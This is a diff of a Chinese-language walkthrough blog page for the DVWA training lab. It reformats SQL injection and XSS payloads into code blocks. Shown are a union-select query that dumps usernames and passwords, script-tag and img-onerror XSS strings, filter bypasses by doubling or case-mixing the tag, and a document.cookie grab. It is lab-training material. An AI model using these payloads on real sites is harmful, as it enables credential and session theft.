@@ -356,13 +356,14 @@
 <p>直接输入表名不行，可以转化为16进制绕过</p>
 <p> <img src="https://s1.ax1x.com/2020/05/09/YQpDQe.png" alt="YQpDQe.png"></p>
 <p>获取数据</p>
-<p>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，</p>
-<p> <img src="https://s1.ax1x.com/2020/05/09/YQpsLd.png" alt="YQpsLd.png"></p>
+<pre><code>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+</code></pre><p> <img src="https://s1.ax1x.com/2020/05/09/YQpsLd.png" alt="YQpsLd.png"></p>
 <p>High：</p>
 <p>查看源码</p>
 <p> <img src="https://s1.ax1x.com/2020/05/09/YQpoLj.png" alt="YQpoLj.png"></p>
 <p>仅仅是多了一个limit，但可以注释掉所以和上述过长一样，就不再赘述</p>
-<p>1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
+<pre><code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+</code></pre><p>查询成功：</p>
 <p> <img src="https://s1.ax1x.com/2020/05/09/YQpHwn.png" alt="YQpHwn.png"></p>
 <p><strong>3)</strong> <strong>SQL Injection(Blind)</strong></p>
 <p>通过sqlmap来进行盲注</p>
@@ -427,12 +428,17 @@
 <p>Low:</p>
 <p>查看源代码</p>
 <p> <img src="https://s1.ax1x.com/2020/05/09/YQ9RB9.png" alt="YQ9RB9.png"></p>
-<p>没有安全措施直接攻击<script>alert('xss')</script></p>
-<p> <img src="https://s1.ax1x.com/2020/05/09/YQ9W7R.png" alt="YQ9W7R.png"></p>
+<p>没有安全措施直接攻击</p>
+<pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
+</code></pre><p> <img src="https://s1.ax1x.com/2020/05/09/YQ9W7R.png" alt="YQ9W7R.png"></p>
 <p>Mid：</p>
 <p>查看源代码</p>
 <p> <img src="https://s1.ax1x.com/2020/05/09/YQ9o9K.png" alt="YQ9o9K.png"></p>
-<p>该代码中删除输入的<script>，只需输入两个<script>，或者大写其中字符</p>
+<p>该代码中删除输入的</p>
+<pre><code>&lt;script&gt;
+</code></pre><p>，只需输入两个</p>
+<pre><code>&lt;script&gt;
+</code></pre><p>，或者大写其中字符</p>
 <p> <img src="https://s1.ax1x.com/2020/05/09/YQ9Hje.png" alt="YQ9Hje.png"></p>
 <p>High：</p>
 <figure class="image-bubble">
@@ -442,8 +448,11 @@
                 </div>
                 <div class="image-caption">YQ9qnH.png</div>
             </figure> 
-<p>通过正则表达式过滤<script>，可以通过img、body等或者iframe等标签的src注入恶意的js代码<IMG src=1 onerror=alert(“AAA”)></p>
-<p> <img src="https://s1.ax1x.com/2020/05/09/YQ9jAI.png" alt="YQ9jAI.png"></p>
+<p>通过正则表达式过滤</p>
+<pre><code>&lt;script&gt;
+</code></pre><p>，可以通过img、body等或者iframe等标签的src注入恶意的js代码</p>
+<pre><code>&lt;IMG src=1 onerror=alert(“AAA”)&gt;
+</code></pre><p> <img src="https://s1.ax1x.com/2020/05/09/YQ9jAI.png" alt="YQ9jAI.png"></p>
 <p><strong>5)</strong> <strong>XSS stored</strong></p>
 <p>Low:</p>
 <p>查看源代码</p>
@@ -456,8 +465,9 @@
             </figure></p>
 <p>源代码对message，name输入框内容 没有进行XSS方面的过滤和检查，可以用burpsuite抓包</p>
 <p> <img src="https://s1.ax1x.com/2020/05/09/YQCkHs.png" alt="YQCkHs.png"></p>
-<p>修改mtxmessage或者name值为<script>alert(document.cookie)</script></p>
-<p> <img src="https://s1.ax1x.com/2020/05/09/YQCVNq.png" alt="YQCVNq.png"></p>
+<p>修改mtxmessage或者name值为</p>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre><p> <img src="https://s1.ax1x.com/2020/05/09/YQCVNq.png" alt="YQCVNq.png"></p>
 <p>Mid:</p>
 <p>使用</p>
 <pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;或者&lt;sCript&gt;alert(document.cookie)&lt;/script&gt;
